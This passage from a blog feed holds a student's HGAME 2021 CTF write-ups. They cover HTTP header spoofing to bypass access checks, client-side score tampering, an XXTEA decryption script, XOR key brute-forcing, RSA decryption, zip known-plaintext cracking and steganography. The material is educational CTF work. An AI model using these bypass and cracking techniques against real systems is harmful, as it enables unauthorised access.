gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(r)))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(rr)))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(s)))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(ss)))</span><br></pre></td></tr></table></figure><h3 id="2-WhitegiveRSA"><a href="#2-WhitegiveRSA" class="headerlink" title="2.WhitegiveRSA"></a>2.WhitegiveRSA</h3><p>​        <img src="/2021/03/27/HGAME-Week2-Writeup/crypto3(2).png" class=""></p><p>​        已知N，那就拿到在线网站里分解出大素数 q 和 p，剩下来都已知就用脚本解密</p><img src="/2021/03/27/HGAME-Week2-Writeup/crypto3.png" class=""><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-Tools"><a href="#1-Tools" class="headerlink" title="1.Tools"></a>1.Tools</h3><p>​        下载解压得到一个压缩包和一张图片，根据题目的 tools 和压缩包名 f5 尝试用 f5 工具破解压缩包密码，破解所需的密码在图片的详细信息中</p><p>​        打开加密压缩包后发现一部分二维码和压缩包，接着就是像之前那样找到压缩包名里的工具解密，最终集齐4张二维码碎片，用win10自带的画图工具拼合，扫码得flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/flag.jpg" class=""><h3 id="2-Telegraph：1601-6639-3459-3134-0892"><a href="#2-Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="2.Telegraph：1601 6639 3459 3134 0892"></a>2.Telegraph：1601 6639 3459 3134 0892</h3><p>​        题目为音频隐写，又提到听着反胃，于是猜测是<strong>摩斯电码</strong>。听了之后，中间有一段嘀嗒声，这一段就是需要摩斯解密的部分，接着把音频拖到 <strong>Audacity</strong> 里面分析</p><p>​        首先看一下频谱图</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc2.png" class=""><p>​        得到<strong>850hz</strong>的提示，之后尝试翻译摩斯电码，发现中间有一段无法辨认就想到要滤波，用的是上面的提示</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc2%EF%BC%882%EF%BC%89.png" class=""><p>​        窄的是**.**   宽的是**-**  ，翻译后解密就得到flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc2%EF%BC%881%EF%BC%89.png" class=""><h3 id="3-Hallucigenia"><a href="#3-Hallucigenia" class="headerlink" title="3.Hallucigenia"></a>3.Hallucigenia</h3><p>​        只给了一张图，那么就先用 Stegsolve 左右调一下得到二维码</p><img src="/2021/03/27/HGAME-Week2-Writeup/solved.bmp" class=""><p>​        扫码得到一串 base64 解码发现最后是 GNP ，根据题目中 **“我们不仅弄错了他的上下，还颠倒了它的左右。” **逆序处理后粘贴到winhex保存为图片</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc3.png" class=""><p>​        发现又是上下左右颠倒，倒回来就得flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/hgame.png" class=""><h3 id="4-DNS"><a href="#4-DNS" class="headerlink" title="4.DNS"></a>4.DNS</h3><p>​        流量包分析，筛选 dns 得到一串域名并访问</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc4.png" class=""><p>​        抓包得</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc4.jpg" class=""><p>​        查一下 SPF 知道是一种 <strong>dns 记录</strong>，那就用在线网站查一下dns记录，得到flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc4(1).png" class=""><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>​        这周比较摸鱼，web 能做出两道是因为给了具体的考点，参照往年 writeup 一点点做下来。   re 做了很久，因为之前没有接触过 apk 逆向，对 aes 加密也不太了解，最后能全部做出来真是太好了，逆向的时候果然是要抓重点，解完题后才发现其实挺简单的。 密码学是真不太行，这周 pwn 也基本没看，Misc 倒是做的挺顺畅的，下周要试着把之前的知识捡起来了</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Week2&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    <category term="Hgame2021" scheme="https://www.0wl.site/categories/Hgame2021/"/>
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-Week1-writeup</title>
    <link href="https://www.0wl.site/2021/03/26/HGAME-Week1-writeup/"/>
    <id>https://www.0wl.site/2021/03/26/HGAME-Week1-writeup/</id>
    <published>2021-03-26T15:52:16.000Z</published>
    <updated>2021-11-16T14:53:22.395Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Week1</p></div></article><span id="more"></span><h1 id="1-web"><a href="#1-web" class="headerlink" title="1.web"></a>1.web</h1><h2 id="1-Hitchhiking-in-the-Galaxy"><a href="#1-Hitchhiking-in-the-Galaxy" class="headerlink" title="1.Hitchhiking_in_the_Galaxy"></a>1.Hitchhiking_in_the_Galaxy</h2><p>​        网页f12发现 /HitchhikerGuide.php , 抓包发现 <strong>302</strong>, 于是在 Linux 中用 curl 命令访问这里,发现 <strong>405</strong> 那么就改用 <strong>post</strong> 请求方式</p><img src="/2021/03/26/HGAME-Week1-writeup/web1.png" class=""><p>​        刚开始看到这句话后没有一点想法,就去看了看发的学习资料,看到 <strong>user-agent</strong> 后意识到应该是要加这个头 (因为引擎)  , 内容是那串英文</p><img src="/2021/03/26/HGAME-Week1-writeup/web1(2).png" class=""><p>​        仅能通过本地访问 , 那么就再加一个 <strong>x-forwarded-for</strong> 头 , 最后说要从茄子学长的网站过来 , 再加一个 <strong>referer</strong> 头,得到 flag</p><img src="/2021/03/26/HGAME-Week1-writeup/web1(3).png" class=""><h2 id="2-watermelon"><a href="#2-watermelon" class="headerlink" title="2.watermelon"></a>2.watermelon</h2><p>​        打开网页发现是合成大西瓜, 玩了一遍发现要达到2000分才能得到flag, 于是毫不犹豫地抓包(可惜接受不到分数,是为什么我也不清楚)        抓包不行那么就只能<strong>修改 js 代码</strong>,然而在我试图修改的过程中发现</p><img src="/2021/03/26/HGAME-Week1-writeup/web2.png" class=""><p>​        把网页变成这样就能轻松玩到2000分! (到底怎么改js代码我不太清楚,应该是要找到存储分数的变量,然后在 console 里修改…..)    </p><p>​        得到 flag</p><img src="/2021/03/26/HGAME-Week1-writeup/web2(2).png" class=""><h2 id="3-宝藏走私者"><a href="#3-宝藏走私者" class="headerlink" title="3.宝藏走私者"></a>3.宝藏走私者</h2><p>​        先拿着学习资料学习了一下,之后点开网页点击 secret data 跳转到另一个界面,提示要是 localhost ,于是加了 host 头</p><img src="/2021/03/26/HGAME-Week1-writeup/web3.png" class=""><p>​        意外的就得到了 flag  (不知道怎么得到的, 好像跟学习资料无关?)</p><h2 id="4-智商检测鸡"><a href="#4-智商检测鸡" class="headerlink" title="4.智商检测鸡"></a>4.智商检测鸡</h2><p>​        用 firefox 浏览器打开网页发现要做100道定积分才能得到 flag, f12看到网页源代码,里面有个 getflag() 函数</p><p>​        在 console 输入后,弹出一句话(是啥我忘了) , 得知这样不行,于是我就搭配定积分计算器解完了这100题,得到 flag                                           (之后看r4u学长发的学习资料,觉得应该是 python 爬虫一类的,可惜我 python 还不太会,只能手动解题了)</p><p>web 总结: web 开始的时候是真的一点都不会, watermelon 和定积分都不是通过 web 知识解的,  burp 也是前几天刚装的(安装花了一天…),总之学到了很多</p><h1 id="2-reverse"><a href="#2-reverse" class="headerlink" title="2.reverse"></a>2.reverse</h1><h2 id="1-apacha"><a href="#1-apacha" class="headerlink" title="1.apacha"></a>1.apacha</h2><p>​    应该是这周 re里最难的（但其实也不是太难），首先用 ida 打开文件并初步分析</p><img src="/2021/03/26/HGAME-Week1-writeup/re1(1).png" class=""><p>​    关键部分在第25和第26行的两个函数</p><img src="/2021/03/26/HGAME-Week1-writeup/re1(3).png" class=""><p>​    第一个关键函数，刚开始看觉得挺复杂的后来发现了 tea 型加密算法的特征，查资料猜测这应该是 <strong>xxtea 加密算法</strong></p><img src="/2021/03/26/HGAME-Week1-writeup/re1(4).png" class=""><p>​    第二个关键函数，判断输入是否为 flag 。加密后的 flag存在unk_501C , 每四个字节一组</p><p>​    之后就是写脚本解密，于是在网上找了一个现成的脚本（ c语言），改了一下就得到 flag（这里有个地方需要<strong>注意</strong>，因为是<strong>小端序</strong>所以  ida 中加密的数据每四个字节要逆序才是真正的加密数据）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tea_DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">uint32_t</span>* origin, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> data[] = </span><br><span class="line">    &#123; <span class="number">0xE74EB323</span>,<span class="number">0xB7A72836</span>,<span class="number">0x59CA6FE2</span>,<span class="number">0x967CC5C1</span>,<span class="number">0xE7802674</span></span><br><span class="line">               ,<span class="number">0x3D2D54E6</span>,<span class="number">0x8A9D0356</span>,<span class="number">0x99DCC39C</span>,<span class="number">0x7026D8ED</span>,<span class="number">0x6A33FDAD</span>,</span><br><span class="line">               <span class="number">0xF496550A</span>,<span class="number">0x5C9C6F9E</span>,<span class="number">0x1BE5D04C</span>,<span class="number">0x6723AE17</span>,<span class="number">0x5270A5C2</span>,</span><br><span class="line">               <span class="number">0xAC42130A</span>,<span class="number">0x84BE67B2</span>,<span class="number">0x705CC779</span>,<span class="number">0x5C513D98</span>,<span class="number">0xFB36DA2D</span>,</span><br><span class="line">            <span class="number">0x22179645</span>,<span class="number">0x5CE3529D</span>,<span class="number">0xD189E1FB</span>,<span class="number">0xE85BD489</span>,<span class="number">0x73C8D11F</span>,<span class="number">0x54B5C196</span>,</span><br><span class="line">            <span class="number">0xB67CB490</span>,<span class="number">0x2117E4CA</span>,<span class="number">0x9DE3F994</span>,<span class="number">0x2F5AA1AA</span>,<span class="number">0xA7E801FD</span>,<span class="number">0xC30D6EAB</span>,</span><br><span class="line">            <span class="number">0x1BADDC9C</span>,<span class="number">0x3453B04A</span>,<span class="number">0x92A406F9</span> </span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">int</span> i, j;<span class="keyword">uint32_t</span>* encode = (<span class="keyword">uint32_t</span>*)data;</span><br><span class="line">  <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">  xxtea(encode, <span class="number">-35</span>, key);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, data[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">uint32_t</span>* origin, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">  <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">  &#123;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = origin[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sum += tea_DELTA;</span><br><span class="line">      e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">      &#123;</span><br><span class="line">        y = origin[p + <span class="number">1</span>];</span><br><span class="line">        z = origin[p] += xxtea_MX;</span><br><span class="line">      &#125;</span><br><span class="line">      y = origin[<span class="number">0</span>];</span><br><span class="line">      z = origin[n - <span class="number">1</span>] += xxtea_MX;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">  &#123;</span><br><span class="line">    n = -n;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">    sum = rounds * tea_DELTA;</span><br><span class="line">    y = origin[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">      &#123;</span><br><span class="line">        z = origin[p - <span class="number">1</span>];</span><br><span class="line">        y = origin[p] -= xxtea_MX;</span><br><span class="line">      &#125;</span><br><span class="line">      z = origin[n - <span class="number">1</span>];</span><br><span class="line">      y = origin[<span class="number">0</span>] -= xxtea_MX;</span><br><span class="line">      sum -= tea_DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/03/26/HGAME-Week1-writeup/re1.png" class=""><h2 id="2-helloRe"><a href="#2-helloRe" class="headerlink" title="2.helloRe"></a>2.helloRe</h2><p>​        这题不难，只是有点 c++ 的语法，同样 ida</p><img src="/2021/03/26/HGAME-Week1-writeup/reverse2(1).png" class=""><p>​    关键在中间的<strong>异或</strong>操作，写个脚本就能得到结果</p><img src="/2021/03/26/HGAME-Week1-writeup/reverse2.png" class=""><h2 id="3-pypy"><a href="#3-pypy" class="headerlink" title="3.pypy"></a>3.pypy</h2><p>​    这题考的是 python 字节码，刚开始看的时候还不太懂python语法花了点时间去理解，通过 dis 文档来分析每一条语句，大概还原了一下</p><img src="/2021/03/26/HGAME-Week1-writeup/re3.png" class=""><p>​    理解之后就是用脚本解题，再加上 hgame{} （刚开始交的时候忘加了）</p><img src="/2021/03/26/HGAME-Week1-writeup/re3(2).png" class=""><h1 id="3-pwn"><a href="#3-pwn" class="headerlink" title="3.pwn"></a>3.pwn</h1><h2 id="1-whitegive"><a href="#1-whitegive" class="headerlink" title="1.whitegive"></a>1.whitegive</h2><p>​        下载，在 Linux 中用 gdb 调试，得知输入数字在栈中的的存储位置为 0x7ffffffffde50</p><img src="/2021/03/26/HGAME-Week1-writeup/pwn1(3).png" class=""><p>​        继续调试，发现最后 if 语句比较的是 rax 和 rdx 的值，而此时 rax 存储的是 ‘paSsw0rd’ 字符串的地址，那么只要输入这个地址的十进制值就能使条件成立</p><img src="/2021/03/26/HGAME-Week1-writeup/pwn1(2).png" class=""><img src="/2021/03/26/HGAME-Week1-writeup/pwn1(4).png" class=""><p>​    nc连接，cat flag（的确挺白给的，毕竟我都能做）</p><p>pwn 总结：我也太菜了只解出白给题 ,看了最后一题但不太会 rop , 总之这周就稍微学习了一下怎么写 pwn 的脚本和一些基础知识以及安装工具</p><h1 id="4-crypto"><a href="#4-crypto" class="headerlink" title="4.crypto"></a>4.crypto</h1><h2 id="2-对称之美"><a href="#2-对称之美" class="headerlink" title="2.对称之美"></a>2.对称之美</h2><p>​    打开链接下载 python 文件</p><p>​    key 是在 ascii 字母和数字里随机选取16个组成，而 cipher 是由明文与循环的 key 异或得到的密文</p><p>​    根据异或特性知道密文与循环的 key 异或就是明文，那么这道题重点就是求出一组 key 。多次下载附件发现 cipher 各不同，那就<strong>利用多个密文</strong>写脚本爆破得到前16位明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">de0 = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">130</span>):</span><br><span class="line">    c.append(<span class="number">0</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="comment">#for i in range(0, 16):</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">62</span>):</span><br><span class="line">    de0.append(xor(cipher0[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher1[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher2[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher3[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher4[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher5[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher6[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher7[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher8[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher9[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher10[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher11[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher12[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher13[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher14[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher15[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher16[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher17[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher18[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher19[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher20[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher21[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher22[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher23[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher24[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher25[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher26[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher27[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher28[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher29[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher30[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher31[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher32[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher33[<span class="number">15</span>], table[j]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> de0:</span><br><span class="line">    c[j] = c[j] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> c[j] == <span class="number">34</span>:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br></pre></td></tr></table></figure><p>​    知道前16位明文，那就可以求得一组 key ，并得到 flag，过程同样是写脚本</p><img src="/2021/03/26/HGAME-Week1-writeup/crypto2.png" class=""><img src="/2021/03/26/HGAME-Week1-writeup/crypto2(2).png" class=""><p>​    Get flag!</p><h2 id="3-Transformer"><a href="#3-Transformer" class="headerlink" title="3.Transformer"></a>3.Transformer</h2><p>​        下载，发现其中一个文件中有flag形式的字符串，还有两个文件分别存储明文和密文，虽然顺序是打乱了的</p><p>​        接下来就采用传统的人工查找<strong>明文和密文一一对应</strong>的方式得到flag</p><p>​        当然那个 txt 文件最后解密还提示 flag 后面要加上年份2021才正确</p><p>（搜了一下题目发现是人工智能模型，我只有人工没有智能……）</p><p>crypto 总结：没想到最后竟是第一题没解出来，本来以为第二题解不出来反而解出来了。这周稍微学了点怎样写解密脚本，收获挺大</p><h1 id="5-misc"><a href="#5-misc" class="headerlink" title="5.misc"></a>5.misc</h1><h2 id="1-Base全家福"><a href="#1-Base全家福" class="headerlink" title="1.Base全家福"></a>1.Base全家福</h2><p>​        题目中提到 <strong>base家族</strong>，查资料得知有不只有 base64 ，再根据不同 base 加密字符的特征多次解密</p><img src="/2021/03/26/HGAME-Week1-writeup/misc1.png" class=""><p>​        如图所示，得到 flag</p><h2 id="2-不起眼压缩包的养成的方法"><a href="#2-不起眼压缩包的养成的方法" class="headerlink" title="2.不起眼压缩包的养成的方法"></a>2.不起眼压缩包的养成的方法</h2><p>​        打开得到图片，题目中提到了<strong>压缩包</strong>，猜测能从图片中得到压缩包，于是在 linux 中用 binwalk 检测发现了压缩包，并用 foremost 命令分离出来</p><img src="/2021/03/26/HGAME-Week1-writeup/misc2(2).png" class=""><p>​        分离解压后得到</p><img src="/2021/03/26/HGAME-Week1-writeup/misc2(3).png" class=""><p>​        发现得到里面的文件需要密码，那就用百度识图来获取之前得到的图片的p站id解密。之后点进plain.zip发现又需要密码，并且发现plain.zip里有flag.zip和相同的NO PASSWORD.txt文件，猜测是利用明文攻击解密，用相同的方式压缩已得到的NO PASSWORD.txt。<img src="/2021/03/26/HGAME-Week1-writeup/misc2(4).png" class=""></p><p>​        根据提示<strong>storage</strong>，用<strong>仅存储</strong>的方式压缩（刚开始不知道storage是存储等级所以卡了一会儿，问了学长后才知道） 再用<strong>ARCHPR</strong>进行破解，得到口令和密钥，最后得到flag.zip的内容。16进制转字符串，得flag<img src="/2021/03/26/HGAME-Week1-writeup/misc2.png" class=""></p><h2 id="3-Galaxy"><a href="#3-Galaxy" class="headerlink" title="3.Galaxy"></a>3.Galaxy</h2><p>​        打开连接下载，得到以**.pcapng**为后缀的文件，之后用 wireshark 打开</p><img src="/2021/03/26/HGAME-Week1-writeup/misc3(4).png" class=""><p>​        如图所示，导出 http 流</p><img src="/2021/03/26/HGAME-Week1-writeup/misc3(3).png" class=""><p>​        找到了遗失的 galaxy 图片，在 windows 下能正常打开，但之后把图片放到 linux 中，想用 binwalk 分析的时候发现在 Linux 下无法打开图片。</p><p>​        上网查资料得知图片的<strong>高和宽可能被修改</strong>，与原来 crc 值不匹配才报错。于是在网上找了个脚本，得到正确的高宽</p><p>![](HGAME-Week1-writeup/misc3 (2).png)</p><p>​        然后就用 winhex 修改高和宽并保存</p><img src="/2021/03/26/HGAME-Week1-writeup/misc3.png" class=""><p>​        得到 flag！</p><img src="/2021/03/26/HGAME-Week1-writeup/galaxy1.png" class=""><h2 id="4-Word-RE-MASTER"><a href="#4-Word-RE-MASTER" class="headerlink" title="4.Word RE:MASTER"></a>4.Word RE:MASTER</h2><p>​        下载得两个文档，发现其中一个文档加密了，那就先打开另一个文档</p><p>​        在 first.docx 文档中发现了 brain 和 fuck 两个单词，猜测有<strong>brainfuck</strong> 加密，但是之后因为不知道密文卡了很久，尝试用 winhex 打开另一个文档得到</p><img src="/2021/03/26/HGAME-Week1-writeup/misc4.png" class=""><p>​        我以为这就是密文了，于是就开心的拿去解密网站解密（当然这是错的）</p><p>​        问了Akira 学长后发现这密文缺少了前半部分，只能转用别的方法。首先尝试把第一个文档的后缀改为 zip ，打开后竟发现</p><img src="/2021/03/26/HGAME-Week1-writeup/misc4(1).png" class=""><p>​        <img src="/2021/03/26/HGAME-Week1-writeup/misc4(3).png" class=""></p><p>​        丢到网站解密后得到 DOYOUKNOWHIDDEN? ，用这个打开第二个文档</p><p>​        因为这个文档密码是 DOYOUKNOWHIDDEN? ，所以立马显示 word 的隐藏字符，得到</p><img src="/2021/03/26/HGAME-Week1-writeup/misc4(4).png" class=""><p>​        一堆<strong>空白字符</strong>，由空格和制表符组成，这里我用箭头和点表示</p><p>​        这之后就卡了很久（大概一天多……），我甚至尝试用二进制01表示，实在想不出来了于是去问学长，提示我搜一下第二个文档图片中出现最多的字的英文（之前一直盯着图片内容看，以为hint是音游梗，果然是我想太多orz）</p><p>​        接着就搜索<strong>snow</strong>，知道了空白字符的隐写，上工具解密</p><img src="/2021/03/26/HGAME-Week1-writeup/misc4(5).png" class=""><p>misc总结：拿到题目后完全没思路，所以在这一周中查了很多资料，觉得自己就是个菜鸡，好在最后全部解了出来，也学到了很多东西</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Week1&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    <category term="Hgame2021" scheme="https://www.0wl.site/categories/Hgame2021/"/>
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
</feed>
